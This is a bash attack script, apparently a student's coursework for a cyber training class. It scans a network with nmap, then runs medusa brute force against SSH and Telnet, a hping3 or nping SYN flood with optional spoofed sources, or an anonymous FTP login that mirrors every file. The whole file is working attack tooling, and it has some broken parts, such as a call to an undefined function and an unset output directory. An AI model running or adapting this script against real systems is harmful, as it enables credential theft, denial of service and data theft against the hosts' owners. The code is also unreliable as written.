#!/bin/bash
#Student: Phua Tong Huat, S32
#Class Code: CFC020823
#Trainer: James

currentDateTime=`date +"%d/%m/%Y %H:%M:%S"`

# get network or IP address from user to scan 
function getNetwork()
{
echo ""
echo "Please enter network or IP address to attack: "
echo ""
	read networkToScan
	validateIP 
}

# function to validate IP input by user and for user to select scan mode if validation is successful
function validateIP()
{
if [[ $networkToScan =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]] || [[ $networkToScan =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))(\/([8-9]|[1-2][0-9]|3[0-2]))([^0-9.]|$) ]] ; 
then
	getIP
else
# exit if ip input is invalid
	echo "The input is not a valid network. Please enter a valid network address with CIDR notation or an IP address. Exiting now... "
	exit
fi
}


# function to get IP address list on network 
function getIP()
{
# use nmap scan to get list of IP address opened and save result into anvarray - ips
	ips=($(sudo nmap -n -sn $networkToScan -oG - | awk '/Up$/{print $2}'))
	listIP
}

# function to list out opened IP addresses on network
function listIP()
{
# display the ip addresses thats active using for loop
	echo "Select one of the following IP addresses"
	echo "Enter the number corresponding to your choice: "
	echo ""
	echo "LIST OF IP ADDRESS" 
	echo "1. Random IP address from the list below"
for i in "${!ips[@]}"; 
do
	echo "$((i+2)). ${ips[i]}"
done

# read the user's choice
	read IPtoAttackIndex

# validate the choice
if [[ $IPtoAttackIndex -ge 1 && $IPtoAttackIndex -le ${#ips[@]}+1 ]]; 
then
# if choice is valid and is random selection of IP, random choose an IP from list
	if [ $IPtoAttackIndex == "1" ];
	then
		echo ""
		echo "You chose $IPtoAttackIndex:"
		echo ""
		echo "Randomly selecting IP address"
		sleep 0.5
		echo "Randomly selecting IP address.  "
		sleep 0.5
		echo "Randomly selecting IP address. . "
		sleep 0.5
		echo "Randomly selecting IP address. . ."
		IPtoAttack=${ips[$((RANDOM % ${#ips[@]}))]};
	else
# else destination IP is as selected
		echo "You chose $IPtoAttackIndex:"
		IPtoAttack=${ips[IPtoAttackIndex-2]};
	fi
# print the selected IP address 
	echo ""
	echo "$IPtoAttack selected!"
	echo ""
# ask user to select the type of attack to conduct on the selected IP address
	echo "Choose the type of attack you wish to conduct on $IPtoAttack"
	selectAttack
else
# the choice is invalid, ask the user to choose again
	echo "Invalid choice. Please select again."
	listIP
fi
}

# function to get user to select attack type and validate the input. 
function selectAttack()
{
# listing out the attacks available
	echo "There are 3 attacks available. Please enter their corresponding number to select the attack"
	echo ""
	echo "1. Brute forcing SSH and Telnet"
	echo "Brute force attack is to use trial and error to crack passwords and login credentials to gain access to port 22 and 23 of the intended server."
	echo ""
	echo "2. DDOS Attack"
	echo "Distributed denial-of-service (DDOS) attack is to disrupt the normal traffic of a targeted server, service or network by overwhelming the target with a flood of Internet 	traffic."
	echo ""
	echo "3. FTP Anon Attack"
	echo "FTP Anon Attack is to attempt login to FTP server using anonymous user account and download all the files from the ftp server to see if any valuable information is left on the unsecured directory. "
	echo "" 
	echo "4. Random Attack"
	echo "The system will randomly select one of the attacks listed above."
	echo ""
# capture the attack type chosen by user
	read AttackType
	validateAttackTypeInput
}

# function to validate the selected attack type and start attack
function validateAttackTypeInput()
{
# exit if input not valid
if [ $AttackType != "1" ] && [ $AttackType != "2" ] && [ $AttackType != "3" ] && [ $AttackType != "4" ]; 
then
	echo "Invalid Attack type. Exiting now.."
	exit 
fi

# if user chose '1', perform brute force attack
if [ $AttackType == "1" ]; 
then
	bruteForceAttack
fi

# if user chose '2', perform DDOS attack
if [ $AttackType == "2" ]; 
then
	DDOSattack
fi

# if user chose '3', perform FTP attack
if [ $AttackType == "3" ]; 
then
	FTPattack
fi

# if user chose '4', randomly choose an attack
if [ $AttackType == "4" ]; 
then
	echo ""
	echo "Randomly selecting attack"
	sleep 0.5
	echo "Randomly selecting attack.  "
	sleep 0.5
	echo "Randomly selecting attack. . "
	sleep 0.5
	echo "Randomly selecting attack. . ."
	echo ""
	randomAttack
fi
}

# function to randomly choose an attack
function randomAttack()
{
	attacks=(bruteForceAttack DDOSattack FTPattack)
	random_attack=${attacks[$((RANDOM % ${#attacks[@]}))]}
	$random_attack
}


# function to perform BF
function bruteForceAttack()
{
	echo ""
	echo "1. Brute Force Attack was selected"
	echo ""
# default username and pw lists for brute forcing
	pwList="./testPw.txt"
	userList="./testUser.txt"

# start ssh BF on selected IP using default lists
	medusa -h $IPtoAttack -U $userList -P $pwList -M ssh -e ns | tee ./$dir_name/SSH_bruteforce.txt
	echo "    ***Brute force on SSH done***"
	echo "    ***Brute force result saved in ./$dir_name/SSH_bruteforce.txt"
	echo ""

# start telnet BF on selected IP using default lists
	medusa -h $IPtoAttack -U $userList -P $pwList -M telnet -e ns | tee ./$dir_name/telnet_bruteforce.txt
	echo "    ***Brute force on Telnet done"
	echo "    ***BRute force result saved in ./$dir_name/telnet_bruteforce.txt"
	echo ""

	
# log the attack details in /var/log/attack.log
	sudo echo "${currentDateTime}, Type of attack: Brute Force on SSH and Telnet, Destination: $IPtoAttack " >> /var/log/attack.log
}

# function to initiate DDOS attack
function DDOSattack()
{
	echo ""
	echo "2. DDOS Attack was selected"
	echo ""
	echo "Checking for hping3..."
# checking if hping3 exists
if test -f "/usr/sbin/hping3"; 
then 
	useHping3
else 
	useNping
fi

# log the attack details in /var/log/attack.log
	sudo echo "${currentDateTime}, Type of attack: DDOS, Destination: $IPtoAttack " >> /var/log/attack.log
}

# function to start ddos using hping3
function useHping3()
{
# hping3 found, starting TCP SYN Flood
	echo "hping3 found, continuing with TCP SYN Flood!"
# ask user for a port to send TCP SYN packets to
	echo ""
	echo "********"
	echo "Enter target port (defaults: 80):"
	echo "********"
	echo ""
	read targetPort
# check if input is a valid port number
if ! [[ "$targetPort" =~ ^[0-9]+$ ]]; 
then
	targetPort=80 
	echo "Invalid port, using port 80"
elif [ "$targetPort" -lt "1" ] || [ "$targetPort" -gt "65535" ]; 
then
	targetPort=80 
	echo "Invalid port, using port 80"
else 
		echo "Using Port $targetPort"
fi

# ask user which source address to use: random spoof or actual IP
	echo ""
	echo "********"
	echo "Select IP SOURCE"
	echo "********"
	echo ""
	echo "[r] for randomly spoofed IP address or [i] for using current interface IP (default)"
	read sourceIP
# default value is i
	: ${sourceIP:=i}
# ask user if any data to be sent with the SYN packet?  Default is to send no data
	echo ""
	echo "********"
	echo "Send data with SYN packet? "
	echo "********"
	echo ""
	echo "[y]es or [n]o (default)"
	read dataNot
# default value is no
	: ${dataNot:=n}

# ask user how much data to send if yes
if [[ $dataNot = y ]]; 
then
	echo "Enter number of data bytes to send (default 3000):"
	read dataSize
# default value is 3000 bytes
	: ${dataSize:=3000}
# if input invalid, use default
	if ! [[ "$dataSize" =~ ^[0-9]+$ ]]; 
	then
		dataSize=3000 
		echo "Invalid input, sending 3000 bytes!"
	fi
# if $dataNot is not equal to y (yes) then send no data
else dataSize=0
fi

# start TCP SYN flood
if [ $sourceIP = "r" ]; 
then
	echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and exit when necessary"
	echo "using random ip"
	sudo hping3 --flood -d $dataSize --frag --rand-source -p $targetPort -S $IPtoAttack
elif [ $sourceIP = "i" ]; 
then
	echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and exit when necessary"
	echo "using interface ip"
	sudo hping3 --flood -d $dataSize --frag -p $targetPort -S $IPtoAttack
else echo "Not a valid option!  Using interface IP"
	echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and exit when necessary"
	sudo hping3 --flood -d $dataSize --frag -p $targetPort -S $IPtoAttack
fi
}

function nping()
{
# using nping for TCP SYN Flood if hping3 not found
	echo "hping3 not available, using nping!"
# ask for target port
	echo "Enter target port (default: 80):"
	read targetPort
# default port is 80
	: ${targetPort:=80}
# validate input
if ! [[ "$targetPort" =~ ^[0-9]+$ ]]; 
then
	targetPort=80
	echo "Invalid port, using port 80"
elif 
[ "$targetPort" -lt "1" ] || [ "$targetPort" -gt "65535" ]; 
then
	targetPort=80 
	echo "Invalid port, using port 80"
else 
	echo "Using Port $targetPort"
fi
# ask user to select source IP 
	echo "Enter Source IP or use [i]nterface IP (default):"
	read sourceIP
# default value is i
	: ${sourceIP:=i}
# ask user how many packets to send per second, default is 10k
	echo "Enter number of packets to send per second (default: 10,000):"
	read pktRate
# default value is 10k
	: ${pktRate:=10000}
# ask user how many packets to send in total?
	echo "Enter total number of packets to send (default: 100,000):"
	read totalPkt
# default is 100k
	: ${totalPkt:=100000}
# begin TCP SYN flood
	echo "Starting TCP SYN Flood..."
if 	[ "$sourceIP" = "i" ]; 
then
	sudo nping --tcp --dest-port $targetPort --flags syn --rate $pktRate -c $totalPkt -v-1 $IPtoAttack
else 
	sudo nping --tcp --dest-port $targetPort --flags syn --rate $pktRate -c $totalPkt -v-1 -S $sourceIP $IPtoAttack
fi
}

# function to perform FTP attack
function FTPattack()
{
	echo "3. FTP Attack was selected"
	echo "Starting FTP attack. Use 'Ctrl c' to end and exit when necessary"
# script to login as ftp user
	ftp -n $IPtoAttack <<SCRIPT 
	quote USER ftp
	quote PASS ftp
	ls ../../../../
	pwd
	cd /home
	quit
SCRIPT

# Check the exit status of the ftp command
#if [ $? -eq 0 ]; 
#then
#	ftpLogin="Anonymous login successful"
#	echo "$ftpLogin"
#else
#	ftpLogin="Anonymous login unsuccessful"
#	echo "$ftpLogin"
#fi

sudo echo "${currentDateTime}, Type of attack: FTP anon login, Destination: $IPtoAttack" >> /var/log/attack.log

downloadfile
}

# function to download files from ftp server to see if there are any valuable content
function downloadfile()
{
echo "dowloading all files found in FTP directory of $IPtoAttack"
# use wget to download all files from FTP directory using anon account
if wget -m ftp://ftp:ftp@$IPtoAttack;
then
	outcome="Download successful"
	echo $outcome
else
	outcome="Download unsuccessful"
	echo $outcome
# log the attack details in /var/log/attack.log
	sudo echo "${currentDateTime}, Type of attack: FTP directory files download, Destination: $IPtoAttack, Result: $outcome " >> /var/log/attack.log
fi
}

getNetwork





